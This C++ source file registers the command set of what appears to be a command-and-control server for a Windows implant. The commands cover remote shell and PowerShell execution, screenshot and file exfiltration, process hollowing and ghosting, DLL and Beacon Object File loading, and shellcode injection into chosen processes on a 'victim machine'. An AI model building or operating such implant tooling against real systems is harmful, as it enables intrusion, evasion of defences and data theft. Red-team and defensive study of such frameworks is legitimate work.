//
// Created by diago on 2024-06-06.
//

#include <baphomet.hpp>

namespace lurch {
    accepted_commands baphomet::commands;
}

void
lurch::baphomet::init_commands() {

    if(!commands.ready()) {

        commands.add_command("pwd", "prints the working directory of the implant");
        commands.add_command("ls", "displays files in the working directory");
        commands.add_command("procenum", "enumerates all running processes on the victim machine");
        commands.add_command("screenshot", "takes a screenshot and exfiltrates it");
        commands.add_command("whoami", "gets whoami.exe info without starting a shell process");
        commands.add_command("get_task", "used by the agent to retrieve a task.");
        commands.add_command("tasks", "display all existing tasks.");
        commands.add_command("die", "tells the running agent to exit.");
        commands.add_command("staged", "display staged files that can be downloaded by the agent.");
        commands.add_command("clear_tasks", "clear all currently assigned tasks.");
        commands.add_command("help", "display this help message and exit.");

        commands.add_command("cd", "changes the working directory")
            .arg<std::string>("--directory", "-d", true);

        commands.add_command("cat", "displays file contents")
            .arg<std::string>("--file-name", "-f", true);

        commands.add_command("mkdir", "creates a directory")
            .arg<std::string>("--directory", "-d", true);

        commands.add_command("rm", "removes a directory or file")
            .arg<std::string>("--directory-entry", "-de", true);

        commands.add_command("cp", "copies a file to a specified location")
            .arg<std::string>("--source", "-s", true)
            .arg<std::string>("--destination", "-d", true);

        commands.add_command("ps", "executes a powershell command and returns the output")
            .arg<std::string>("--command", "-c", true);

        commands.add_command("cmd", "executes a shell command (cmd.exe) and returns the output")
            .arg<std::string>("--command", "-c", true);

        commands.add_command("upload", "exfiltrates a file")
            .arg<std::string>("--directory-entry", "-de", true);

        commands.add_command("runexe", "runs an executable file on the victim machine")
            .arg<std::string>("--staged-file", "-sf", true)
            .arg<empty>("--hollow", "-h", false)
            .arg<empty>("--ghost", "-g", false);

        commands.add_command("rundll", "runs a DLL on the victim machine")
            .arg<std::string>("--staged-file", "-sf", true);

        commands.add_command("runbof", "runs a Beacon Object File on the victim machine") // TODO: no bof arguments yet :(
            .arg<std::string>("--staged-file", "-sf", true);

        commands.add_command("runshellcode", "loads shellcode into memory and executes it")
            .arg<std::string>("--staged-file", "-sf", true)
            .arg<empty>("--local", "-l", false)
            .arg<int64_t>("--pid", "-p", false);

        commands.add_command("complete_task", "used by the agent to complete a task.")
            .arg<std::string>("--result", "-r", true);

        commands.done();
    }
}